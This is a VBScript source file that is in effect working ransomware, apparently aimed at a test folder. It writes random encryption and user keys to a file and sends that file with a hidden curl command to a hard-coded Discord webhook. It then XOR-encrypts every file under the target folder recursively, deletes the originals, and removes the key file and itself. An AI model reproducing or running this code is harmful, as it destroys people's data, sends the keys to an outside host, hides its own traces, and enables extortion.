Option Explicit

Dim objFSO, objFolder, objFile, objShell, fso, filepath, key

filepath = "D:\coding\pws\testfolder"

Function GenerateRandomString()
    Randomize
    Dim charset, result, i
    charset = "0123456789"
    result = ""
    For i = 1 To 16
        result = result & Mid(charset, Int((Len(charset) * Rnd) + 1), 1)
    Next
    GenerateRandomString = result
End Function

Dim randomString, randomString1
randomString = GenerateRandomString()
randomString1 = GenerateRandomString()

' Create FileSystemObject
Dim fso1, outFile
Set fso1 = CreateObject("Scripting.FileSystemObject")

' Open the file for writing
Set outFile = fso1.CreateTextFile("a.txt", True)

' Write the variables to the file
outFile.WriteLine "EncryptionKey=" & randomString
outFile.WriteLine "UserKey=" & randomString1
outFile.WriteLine "FilePath=" & filepath

' Close the file
outFile.Close

Dim discordWebhook
discordWebhook = "https://discord.com/api/webhooks/1219756269485690974/0ira1jah4MVLyBIhZqqDNv7v-mE7B98_fmAW-bndBGIwiV-m0RPyDJSwnVe8-0gE0WEU"

' Construct the cURL command to send variables as form data
Dim curlCommand
curlCommand = "curl -i -X POST -H ""Content-Type: multipart/form-data"" -F ""file=@a.txt"" " & discordWebhook

' Run the cURL command
Dim objShell2
Set objShell2 = CreateObject("WScript.Shell")
objShell2.Run curlCommand, 0, True

Set objFSO = CreateObject("Scripting.FileSystemObject")

' Call the recursive function to start the search
ListFilesInFolders objFSO.GetFolder(filepath)

' Function to XOR encrypt file content
Function XOREncryptFile(filePath, key)
    Dim fso, inputFile, outputFile, inputContent, outputContent, i, keyIndex, encryptedFilePath

    ' Create FileSystemObject
    Set fso = CreateObject("Scripting.FileSystemObject")

    ' Open input file for reading
    Set inputFile = fso.OpenTextFile(filePath, 1, False)
    inputContent = inputFile.ReadAll
    inputFile.Close

    ' XOR encrypt the file content
    outputContent = ""
    keyIndex = 1
    For i = 1 To Len(inputContent)
        outputContent = outputContent & Chr(Asc(Mid(inputContent, i, 1)) Xor Asc(Mid(key, keyIndex, 1)))
        keyIndex = keyIndex Mod Len(key) + 1
    Next

    ' Write encrypted content to a new file
    encryptedFilePath = filePath & ".encrypted"
    Set outputFile = fso.CreateTextFile(encryptedFilePath, True)
    outputFile.Write outputContent
    outputFile.Close

    XOREncryptFile = encryptedFilePath
End Function

Sub ListFilesInFolders(objFolder)
    Dim objSubFolder

    ' Loop through each file in the current folder
    For Each objFile In objFolder.Files
        XOREncryptFile objFile.Path, randomString

        Set fso = CreateObject("Scripting.FileSystemObject")
        fso.DeleteFile objFile.Path
        Set fso = Nothing
    Next

    ' Recursively call the function for each subfolder
    For Each objSubFolder In objFolder.SubFolders
        ListFilesInFolders objSubFolder
    Next
End Sub

Dim filesToDelete, file
filesToDelete = Array("a.txt", WScript.ScriptFullName)

' Delete each file
For Each file In filesToDelete
    If objFSO.FileExists(file) Then
        ' Delete the file
        objFSO.DeleteFile file
    End If
Next